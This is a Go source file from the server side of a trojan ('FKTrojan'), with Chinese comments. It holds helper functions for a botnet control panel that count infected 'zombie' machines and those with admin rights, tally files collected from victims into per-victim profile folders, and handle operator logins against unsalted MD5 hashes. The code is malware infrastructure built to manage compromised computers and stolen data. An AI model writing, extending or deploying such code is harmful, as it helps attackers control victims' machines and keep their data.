/*
Author: FreeKnight
基本函数支持
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"time"
)

//------------------------------------------------------------
// 肉鸡个数
func ClientCount() int {
	rows, err := DBPointer.Query("SELECT COUNT(*) AS count FROM clients")
	if err != nil {
		return 0
	}
	var count int

	defer rows.Close()
	for rows.Next() {
		rows.Scan(&count)
	}
	return count
}

//------------------------------------------------------------
// 具有管理员权限的肉鸡个数
func AdminClientCount() int {
	rows, _ := DBPointer.Query("SELECT COUNT(*) AS count FROM clients WHERE isadmin= 'Yes'")
	var count int

	defer rows.Close()
	for rows.Next() {
		rows.Scan(&count)
	}
	return count
}

//------------------------------------------------------------
// 提示个错
func reportError(w http.ResponseWriter, err error) {
	fmt.Fprintf(w, "Error during operation: %s", err)
}

//------------------------------------------------------------
// 数据库中的文件总数
func DBFilesCount() int {
	var tmpint int
	profiles, _ := ioutil.ReadDir(ProfileDir)
	for _, f := range profiles {
		files, _ := ioutil.ReadDir(ProfileDir + f.Name() + "/Files")
		tmpint = tmpint + len(files)
	}
	return tmpint
}

//------------------------------------------------------------
// 获取上次登录时间
func GetLastLoginTime(set bool) string {
	var tmp string
	if set {
		_, err := DBPointer.Exec("UPDATE lastlogin SET timeanddate='" + time.Now().Format(time.RFC850) + "' WHERE id=1")
		if err != nil {
			fmt.Println(err)
		}
		return ""
	} else {
		err := DBPointer.QueryRow("SELECT timeanddate FROM lastlogin WHERE id=1").Scan(&tmp)
		if err != nil {
			return "Never"
		}
		return tmp
	}
	return "Never"
}

//------------------------------------------------------------
// 肉鸡的列表显示Html
func createcountDiv() string {
	return `<div align="center">Total in Database: [` + strconv.Itoa(ClientCount()) +
		`] | Total with Admin: [` + strconv.Itoa(AdminClientCount()) +
		`] | Total Files in Database: [` + strconv.Itoa(DBFilesCount()) + `]</div>`
}

//------------------------------------------------------------
// 允许从数据库中的账号密码的登录
func IsCanLoginByDB(user, pass string) bool {
	var databaseUsername string
	var databasePassword string
	err := DBPointer.QueryRow("SELECT username, password FROM accounts WHERE username=?", user).Scan(&databaseUsername, &databasePassword)
	if err != nil {
		return false
	}
	if databasePassword == common.Md5Hash(pass) {
		return true
	} else {
		return false
	}
}

//------------------------------------------------------------
// fileName:文件名字(带全路径)
// content: 写入的内容
func AppendToFile(fileName string, content string) error {
	// 以只写的模式，打开文件
	f, err := os.OpenFile(fileName, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		return fmt.Errorf("AppendToFile %s error %v", fileName, err)
	}
	defer f.Close()
	// 查找文件末尾的偏移量
	n, _ := f.Seek(0, io.SeekEnd)
	// 从末尾的偏移量开始写入内容
	_, err = f.WriteAt([]byte(content), n)
	return err
}

//------------------------------------------------------------
